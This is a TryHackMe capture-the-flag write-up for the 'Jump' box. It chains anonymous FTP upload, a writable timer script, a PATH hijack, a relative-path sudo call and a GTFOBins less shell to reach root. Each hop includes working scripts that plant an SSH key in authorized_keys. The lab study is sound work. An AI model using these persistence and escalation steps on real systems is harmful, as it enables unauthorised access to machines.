# Jump — TryHackMe

**Platform:** TryHackMe · **Difficulty:** easy · **Date:** 2026-11-19

## Summary
A five-user privilege-escalation chain from an anonymous FTP login to root. Each hop
abuses a different flavour of "something trusted runs code you can write": an upload
pipeline, a group-writable timed script, a PATH hijack, a relative-path call inside a
sudo'd script, and finally a GTFOBins sudo binary. Foothold and every lateral move is a
variation on planting your SSH key into the next user's `authorized_keys`.

The key-plant snippet is the same every hop — only the target home dir changes.
`<PUBKEY>` is the public half of a keypair made on Kali (`ssh-keygen -t ed25519 -f jump_key`).

## Enumeration
`nmap -sV TARGET` → two ports open: 21 (FTP, anonymous allowed) and 22 (SSH).
Logged into FTP anonymously; `incoming/` is world-writable and an automated pipeline
executes scripts dropped there as `recon_user`.

## Foothold
Wrote a script that appends the public key to `recon_user`'s `authorized_keys`, and
`put` it into `incoming/` over FTP. The pipeline ran it as `recon_user`.

```bash
# plant.sh — uploaded into incoming/ over anonymous FTP
#!/bin/bash
mkdir -p /home/recon_user/.ssh
chmod 700 /home/recon_user/.ssh
echo '<PUBKEY>' >> /home/recon_user/.ssh/authorized_keys
chmod 600 /home/recon_user/.ssh/authorized_keys
```

`ssh -i jump_key recon_user@TARGET` → **flag 1**.

## Privilege escalation
Four hops, each the same key-plant idea against a different weakness.

### 1. recon_user → dev_user
`/opt/dev/backup.sh` is group `dev_user` and group-writable, run on a short timer as
`dev_user`. Overwrote it with the key-plant:

```bash
cat > /opt/dev/backup.sh <<'EOF'
#!/bin/bash
mkdir -p /home/dev_user/.ssh
chmod 700 /home/dev_user/.ssh
echo '<PUBKEY>' >> /home/dev_user/.ssh/authorized_keys
chmod 600 /home/dev_user/.ssh/authorized_keys
EOF
```

Wait one cycle, `ssh -i jump_key dev_user@TARGET` → **flag 2**.

### 2. dev_user → monitor_user
A healthcheck service running as `monitor_user` calls `ps` with `/opt/dev/bin` first on
its `PATH`, and that dir is writable. Dropped a malicious `ps` there:

```bash
cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash
mkdir -p /home/monitor_user/.ssh
chmod 700 /home/monitor_user/.ssh
echo '<PUBKEY>' >> /home/monitor_user/.ssh/authorized_keys
chmod 600 /home/monitor_user/.ssh/authorized_keys
EOF
chmod +x /opt/dev/bin/ps
```

The service ran it; `ssh -i jump_key monitor_user@TARGET` → **flag 3**.

### 3. monitor_user → ops_user
`sudo -l` shows `(ops_user) NOPASSWD: /usr/local/bin/deploy.sh`, which does
`cd /opt/app && ./deploy_helper.sh` by **relative** path. `/opt/app/deploy_helper.sh` is
writable; overwrote it, then triggered the sudo'd script by hand (no timer on this one):

```bash
cat > /opt/app/deploy_helper.sh <<'EOF'
#!/bin/bash
mkdir -p /home/ops_user/.ssh
chmod 700 /home/ops_user/.ssh
echo '<PUBKEY>' >> /home/ops_user/.ssh/authorized_keys
chmod 600 /home/ops_user/.ssh/authorized_keys
EOF

sudo -u ops_user /usr/local/bin/deploy.sh
```

`ssh -i jump_key ops_user@TARGET` → **flag 4**.

### 4. ops_user → root
`sudo -l` shows `(root) NOPASSWD: /usr/bin/less`. GTFOBins — `less` spawns a shell from
inside the pager, inheriting root:

```bash
sudo /usr/bin/less /etc/profile
# then, inside the pager:
!/bin/sh
# → root shell
cat /root/flag.txt
```

## Flags / Answers
- flag 1 (recon_user): `REDACTED`
- flag 2 (dev_user): `REDACTED`
- flag 3 (monitor_user): `REDACTED`
- flag 4 (ops_user): `REDACTED`
- root flag (`/root/flag.txt`, not root.txt): `REDACTED`

## Lessons
- Every hop in a chain can be the *same* primitive (key-plant) against a different
  trust boundary — writable timer script, PATH hijack, relative-path sudo call, GTFOBins.
- `sudo -l` is the first thing to run on every new user. It answered two of the four hops.
- GTFOBins `less` → `!/bin/sh` is a must-know; `vim`, `find`, `awk` do the same.
